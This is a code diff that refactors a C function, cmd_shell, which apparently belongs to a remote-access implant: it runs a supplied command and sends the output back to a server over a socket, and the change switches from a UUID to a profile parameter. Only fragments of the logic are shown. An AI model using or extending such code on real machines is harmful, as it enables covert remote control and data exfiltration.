@@ -2,18 +2,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
 #include <sys/mman.h>
-#include <sys/stat.h>
-#include <time.h>
-#include <sys/wait.h>
-#include <liburing.h>
 #include "functions/send/send2serv.h"
 #include "functions/connection/connection.h"
 #include "functions/split/split.h"
 
-void cmd_shell(request_t *req, int sockfd, const char *uuid, char *input) {
+void cmd_shell(request_t *req, int sockfd, const profile_t *profile, const char *input) {
 
     srand(time(NULL));
     const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
@@ -25,8 +19,8 @@ void cmd_shell(request_t *req, int sockfd, const char *uuid, char *input) {
         int name_index = rand() % charset_len;
         name[i] = charset[name_index];
     }
-
-    char **args = split(input, ' ', 150);
+    char *cp_input = strdup(input);
+    char **args = split(cp_input, ' ', 150);
     char *command = args[0];
 
     name[name_len] = '\0';
@@ -61,7 +55,7 @@ void cmd_shell(request_t *req, int sockfd, const char *uuid, char *input) {
 
     if (!found_path) {
         char *message = "ERROR: Command binary not found or error executing command";
-        send2serv(req, uuid, message, strlen(message));
+        send2serv(req, profile, message, strlen(message));
         free(args); // Clean up memory from split
         return;     // Stop execution
     }
@@ -127,7 +121,7 @@ void cmd_shell(request_t *req, int sockfd, const char *uuid, char *input) {
             memcpy(output_buffer + total_size, read_chunk, bytes_read);
             total_size += bytes_read;
         }
-        send2serv(req, uuid, output_buffer, total_size);
+        send2serv(req, profile, output_buffer, total_size);
         free(output_buffer);
     }
     free(args);
